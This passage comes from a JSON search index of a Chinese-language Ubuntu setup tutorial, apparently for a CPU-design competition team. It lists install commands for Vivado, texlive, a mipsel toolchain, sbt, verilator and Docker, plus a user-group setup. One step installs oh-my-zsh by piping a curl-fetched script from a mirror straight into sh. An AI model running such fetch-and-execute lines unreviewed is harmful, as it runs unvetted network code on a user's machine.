ssh\u670d\u52a1","text":"<pre><code>$ sudo apt-get install openssh-server\n</code></pre>"},{"location":"tutorials/ubuntu/#5-vivado","title":"5. vivado","text":"<p>\u5b89\u88c5vivado2019.2</p> <pre><code>$ sudo apt install libncurses5\n</code></pre> <p>\u5728<code>.bashrc</code> \u6587\u4ef6\u4e2d\u6dfb\u52a0</p> <pre><code>$ source /opt/xilinx/Vivado/2019.2/settings64.sh\n</code></pre>"},{"location":"tutorials/ubuntu/#6-texlive","title":"6. texlive","text":"<pre><code>$ sudo apt install texlive\n</code></pre>"},{"location":"tutorials/ubuntu/#7","title":"7. \u6dfb\u52a0\u65b0\u7528\u6237\u7ec4","text":"<pre><code>$ sudo groupadd nscscc2022\n$ sudo useradd -m -G nscscc2022 ty # -m \u521b\u5efa\u76ee\u5f55 -G \u6dfb\u52a0\u81f3\u7528\u6237\u7ec4\n$ sudo useradd -m -G nscscc2022 wjj\n$ sudo passwd ty\n$ sudo passwd wjj\n</code></pre> <p>\u5b89\u88c5zsh</p> <pre><code>$ sudo apt install zsh\n</code></pre> <p>\u914d\u7f6eoh-my-zsh</p> <pre><code>$ sh -c \"$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh \\\n    | sed 's|^REPO=.*|REPO=${REPO:-mirrors/oh-my-zsh}|g' \\\n    | sed 's|^REMOTE=.*|REMOTE=${REMOTE:-https://gitee.com/${REPO}.git}|g')\"\n</code></pre>"},{"location":"tutorials/ubuntu/#8","title":"8. \u9f99\u82af\u73af\u5883\u914d\u7f6e","text":"<pre><code># install mipsel cross compiler\n$ sudo apt install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu\n$ sudo apt install gdb-multiarch\n$ sudo apt install qemu-system-mipsel # \u8fd9\u4e2aqemu\u7684\u7248\u672c\u8fc7\u9ad8\u4e86\n\n# install java\n$ sudo apt install openjdk-11-jdk\n\n# install sbt\n$ sudo apt-get update\n$ sudo apt-get install apt-transport-https curl gnupg -yqq\n$ echo \"deb https://repo.scala-sbt.org/scalasbt/debian all main\" | sudo tee /etc/apt/sources.list.d/sbt.list\n$ echo \"deb https://repo.scala-sbt.org/scalasbt/debian /\" | sudo tee /etc/apt/sources.list.d/sbt_old.list\n$ curl -sL \"https://keyserver.ubuntu.com/pks/lookup?op=get&amp;search=0x2EE0EA64E40A89B84B2DF73499E82A75642AC823\" | sudo -H gpg --no-default-keyring --keyring gnupg-ring:/etc/apt/trusted.gpg.d/scalasbt-release.gpg --import\n$ sudo chmod 644 /etc/apt/trusted.gpg.d/scalasbt-release.gpg\n$ sudo apt-get update\n$ sudo apt-get install sbt\n\n# install verilator\n$ sudo apt-get install verilator\n</code></pre>"},{"location":"tutorials/ubuntu/#9-docker","title":"9. docker\u5b89\u88c5","text":"<p>[\u53c2\u8003\u5b89\u88c5\u6587\u7ae0](https://docs.docker.com/engine/install/ubuntu/ </p> <pre><code>$ sudo apt-get update\n$ sudo apt-get install \\\n    ca-certificates \\\n    curl \\\n    gnupg \\\n    lsb-release\n$ sudo mkdir -p /etc/apt/keyrings\n$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n$ echo \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\\n  $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n$ sudo apt-get update\n$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n</code></pre>"},{"location":"tutorials/ubuntu/#docker-qemu-system-mipsel","title":"docker \u89e3\u51b3 qemu-system-mipsel \u7248\u672c\u95ee\u9898","text":"<pre><code>$ sudo docker pull ubuntu:20.04\n$ sudo docker run -it -name ubuntu20 -v ~:/ccc ubuntu:20.04 /bin/bash  \u76ee\u5f55\u6302\u8f7d\n$ sudo docker start ubuntu20\n$ sudo docker exec -it ubuntu20 /bin/bash\n</code></pre> <p><pre><code>$ apt-get update    \n$ apt-cache madison qemu-system-mips # \u67e5\u770b\u53ef\u7528\u7248\u672c\n$ apt install qemu-system-mips=1:4.2-3ubuntu6.23\n</code></pre> \u7136\u540e\u91cd\u590d8\u4e2d\u7684\u6b65\u9aa4</p>"},{"location":"tutorials/ubuntu/#_1","title":"\u5176\u4ed6\u4e00\u4e9b\u8f6f\u4ef6\u7684\u5b89\u88c5","text":"<pre><code>sudo apt-get install p7zip-full # 7-zip\n</code></pre>"}]}